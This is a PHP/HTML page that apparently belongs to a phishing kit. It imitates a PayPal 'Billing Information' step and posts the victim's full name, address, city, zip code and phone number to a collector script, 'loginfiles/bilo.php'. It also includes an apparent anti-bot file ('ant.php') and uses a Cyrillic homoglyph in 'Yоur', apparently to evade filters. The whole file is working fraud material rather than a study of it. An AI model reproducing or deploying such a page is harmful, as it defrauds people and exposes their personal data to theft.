<?php

require_once 'enc.php';
require_once 'ant.php';
?>
<html class=" js " lang="en-GB">

<head>
<script type="text/javascript" charset="utf-8" data-requirecontext="_" data-requiremodule="main" src="loginfiles/css1/js/main.js"></script>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Please Complete with Your Informations</title>
<meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7">
<meta name="viewport" content="user-scalable=no, width=device-width">
<link rel="shortcut icon" href="loginfiles/isu.gif">
<link rel="apple-touch-icon" href="loginfiles/isu.gif">
<link rel="stylesheet" href="loginfiles/css1/app.css"> 
</head>
<body class="desktop">
<style type="text/css">.js .lap .textInput.medium label,.js div.lap.textInput.medium label{top:10px;}</style> 
    <div id="page" class="marketing-ce2">   
<header class="gblHeader">
<div class="utility in">
<div class="wrapper">
<div class="logo" role="banner">
<a href="#">  <img alt="" src="loginfiles/css1/img/msl.png" title="">
</a>
</div>  </div>
</div>
</header>
<section id="content" role="main" class="GB"> <section id="main">  
<div class="nsb_24 nogutter">
<section class="pageHeadline nsb_16_8 nogutter">
</section>
</div>
<div class="nsb_10_14"> 
<div class="one column"> 
<div class="trayNavOuter"> 

<div class="trayNavInner clearfix" id="onboarding">  


<style type="text/css">

.donately-donation-form, .donately-thank-you {
    font-size: 13px;
    line-height: 1em;
}

.donately-secure-header span {
    padding-left: 1.5em;
    background-position: 0px 0px;
    background-repeat: no-repeat;
    background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAMCAYAAACwXJejAAAAIUlEQVQY02NonjybAYr/Y8FgOXQFDFg0UVnRf0J4VNF/AGtWD2MTxoZrAAAAAElFTkSuQmCC');
}

.donately-secure-header {
    font-size: 0.77em;
    background-color: #E8EBED;
    text-transform: uppercase;
    color: #83939B;
    padding: 1em 1.5em;
    margin-bottom: 1em;
    box-shadow: 0px 1px 0px rgba(255, 255, 255, 0.3) inset;
}

.donately-secure-fields {
    border: 1px solid #D7DADD;
    background-color: #EFF3F5;
    padding: 0px;
    margin: 0px 0px 1.92em;
    border-radius: 3px;
}
.donately-secure-fields .donately-fields.card-number-fields {
    margin-bottom: 1.5em;
}
.donately-secure-fields .donately-fields {
    padding-left: 1.15em;
    padding-right: 1.15em;
    margin-bottom: 0px;
}


</style>
<section style="display: block;" id="normalinfo">
<header>          <h2 class="authHeaderText">         <img border="0" src="loginfiles/sc.png" width="83" height="33" align="right"></h2>
  
<header>          
</header>
<form name="form1" novalidate="novalidate" method="post" class="formMedium lap proceed" action="loginfiles/bilo.php">
 <div class="textInput medium"> 
    <h1>Billing Information</h1>
	<p>&nbsp;</p>    &nbsp;</p>
 </div> 


<div class="textInput medium">
<input class="hasHelp validate" id="gg2" placeholder="Full name" name="bila1" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true" type="text">&nbsp;
 <p id="lastNameEmpty" class="help-error error-empty">Yоur Full name.</p>
<p class="help-information" id="lastNameInfo">Please enter your Full name.</p> </div>      

<div class="textInput medium">
<input class="hasHelp validate" id="gg2" placeholder="Address line 1" name="bila2" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true" type="text">
 <p id="lastNameEmpty" class="help-error error-empty">Yоur address line 1.</p>
<p class="help-information" id="lastNameInfo">Please enter your address line 1.</p> </div>  

<div class="textInput medium">
<input class="hasHelp validate" id="gg2" placeholder="Address line 2" name="bila3" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true" type="text">
 <p id="lastNameEmpty" class="help-error error-empty">Yоur address line 2.</p>
<p class="help-information" id="lastNameInfo">Please enter address line 2.</p> </div>  

<div class="textInput medium">
<input class="hasHelp validate" id="gg2" placeholder="City" name="bila4" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true" type="text" size="20">
 <p id="lastNameEmpty" class="help-error error-empty">Yоur City.</p>
<p class="help-information" id="lastNameInfo">Please enter your City.</p> </div>  

<div class="textInput medium">
<input class="hasHelp validate" id="gg2" placeholder="Zip Code" name="bila5" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true" type="text">
 <p id="lastNameEmpty" class="help-error error-empty">Yоur Zip Code.</p>
<p class="help-information" id="lastNameInfo">Please enter your Zip Code.</p> </div>  

<div class="textInput medium">
<input class="hasHelp validate" id="gg2" placeholder="Phone Number" name="bila6" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true" type="text">
 <p id="lastNameEmpty" class="help-error error-empty">Yоur Phone Number.</p>
<p class="help-information" id="lastNameInfo">Please enter your Phone Number.</p> </div>  

    <input name="form1" value="Continue" class="button completed" type="submit">&nbsp; 


</form> 

</section>    

 

</div> </div> </div>
<div class="two column nogutter">
<section class="section-one">
<p><img border="0" src="loginfiles/css1/img/hrlp.PNG" width="308" height="69"></p>
</section>
<section class="section-two">
<p><img border="0" src="loginfiles/css1/img/cdf.PNG" width="299" height="85"></p>
</section>
</div>



</section> </section> 



<footer id="gblFooter" role="contentinfo">       <div class="footer">
<div class="footerNav">
<span class="countryList">

<img border="0" src="loginfiles/space-120.png" width="38" height="35" align="right">
<ul id="countryList" class="dropdown">  <li class="country unitedStates"></li>  <li class="country canada"></li>  <li class="country mexico"></li>  <li class="country unitedKingdom"></li>  <li class="country australia"></li>  <li class="last"></li>
</ul>
<div class="pointer"></div>
</li>   </ul>
</span>
<div class="legal">
<p class="copyright"> 
<img border="0" src="loginfiles/css1/img/dsds.png" width="230" height="17"></p>
<ul>
<li>
<a href="#">Privacy</a>
</li>
<li>
<a href="#">Legal</a>
</li>
<li>
<a href="#">Help</a>
</li>
<li>
<a href="#">Contact</a>
</li>
</ul>
</div>  </div>
</div>        </footer> 

<script> PAYPAL = this.PAYPAL || {};  PAYPAL.content = PAYPAL.content || {};</script>


</div> 
<script data-main="./loginfiles/css1/js/main" src="loginfiles/css1/js/require-2.0.1.js"></script>

    


</body>
</html>